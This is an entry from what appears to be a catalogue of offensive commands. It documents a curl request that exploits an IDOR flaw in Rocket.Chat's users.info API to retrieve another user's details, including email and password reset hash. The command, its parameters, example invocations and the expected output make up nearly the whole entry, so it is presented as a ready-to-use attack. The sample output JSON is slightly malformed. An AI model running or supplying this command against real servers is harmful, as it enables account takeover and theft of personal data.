---
id: c2e3f4g5-h6i7-8902-defg-678901234567
data: >-
  curl -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $USER_ID"
  "https://target/api/v1/users.info?userId=$TARGET_ID"
tags:
  - api
  - info-retrieval
type: command
output: JSON user details including email and reset hash.
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:24.538Z'
verified: false
validated: true
submitted: true
---
# curl-users-info

## Command

```bash
curl -H "X-Auth-Token: $TOKEN" -H "X-User-Id: $USER_ID" "https://target/api/v1/users.info?userId=$TARGET_ID"
```

## Description

Fetches detailed info for a specific user by ID in Rocket.Chat, bypassing auth checks via IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "X-Auth-Token: $TOKEN"` | Session token | Yes |
| `-H "X-User-Id: $USER_ID"` | Session user ID | Yes |
| `?userId=$TARGET_ID` | Target user ID | Yes |

## Examples

### Basic Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" "https://target/api/v1/users.info?userId=target123"
```

### Advanced Usage

```bash
curl -H "X-Auth-Token: abc123" -H "X-User-Id: user456" "https://target/api/v1/users.info?userId=$TARGET_ID" | jq '.user'
```

## Expected Output

JSON: {"user": {="_id": "target123", "emails": [...], "reset": {"hash": "abcDEF123"}}}

## Related

- [[commands/curl-users-list]]
